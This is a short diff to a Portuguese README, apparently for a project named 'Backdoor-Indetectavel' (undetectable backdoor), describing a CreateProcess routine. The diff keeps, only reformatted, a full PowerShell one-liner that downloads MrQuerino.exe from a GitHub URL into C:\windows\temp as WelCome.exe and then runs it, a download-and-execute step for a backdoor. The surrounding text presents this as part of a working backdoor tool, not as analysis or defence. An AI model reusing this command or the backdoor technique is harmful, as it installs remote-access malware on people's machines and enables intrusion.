@@ -14,9 +14,9 @@ void Decrypter(char CriptXor[]) {
 ### CreateProcess
 Essa parte do código cria o processo powershell usando API do windows, abrindo o processo onde os seguintes comando são coordenados para fazer, fazer download do executável MrQuerino.exe via "wget", alocando na pasta temp com o nome de WelCome.exe e na sequência executando.
 
-```ps1
-powershell.exe wget https://github.com/andreyquerino/Backdoor-Indetectavel/blob/main/MrQuerino.exe?raw=true -o C:\\windows\\temp\\WelCome.exe;start C:\\windows\\temp\\WelCome.exe
-```
+
+> powershell.exe wget https://github.com/andreyquerino/Backdoor-Indetectavel/blob/main/MrQuerino.exe?raw=true -o C:\\windows\\temp\\WelCome.exe;start C:\\windows\\temp\\WelCome.exe
+
 
 ```c++
 void Run() {
